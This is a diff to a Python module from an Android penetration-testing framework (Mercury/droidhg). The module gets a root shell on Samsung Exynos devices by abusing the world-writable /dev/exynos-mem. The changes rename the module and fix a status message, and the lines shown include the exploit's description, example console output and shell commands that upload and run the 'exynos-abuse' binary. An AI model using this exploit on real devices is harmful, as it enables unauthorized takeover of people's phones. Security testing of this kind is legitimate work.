@@ -1,7 +1,7 @@
 from mwr.droidhg.modules import common, Module
 import os
 
-class Exynos(Module, common.Vulnerability, common.Shell, common.FileSystem, common.ClassLoader):
+class ExynosMem(Module, common.Vulnerability, common.Shell, common.FileSystem, common.ClassLoader):
 
     name = "Obtain a root shell on Samsung Galaxy S2, S3, Note 2 and some other devices."
     description = """Escalate privileges to root on Samsung Galaxy S2, S3, Note 2 and other devices using Exynos processors and Samsung kernel sources.
@@ -11,7 +11,7 @@ This module uses the vulnerability and exploit provided in http://forum.xda-deve
 The provided exploit makes use of the fact that /dev/exynos-mem is marked as globally RW and so can be exploited from the context of any application to obtain a root shell on the device.
 """
     examples = """
-    mercury> run exploit.root.exynos
+    mercury> run exploit.root.exynosmem
     [*] Uploading exynos-abuse
     [*] Upload successful
     [*] chmod 770 exynos-abuse
@@ -45,7 +45,7 @@ The provided exploit makes use of the fact that /dev/exynos-mem is marked as glo
 
         # Open shell and execute
         if length != None:
-            self.stdout.write("[*] Successful\n")
+            self.stdout.write("[*] Upload successful\n")
             self.stdout.write("[*] chmod 770 exynos-abuse\n")
             self.shellExec("chmod 770 /data/data/com.mwr.droidhg.agent/exynos-abuse")
             
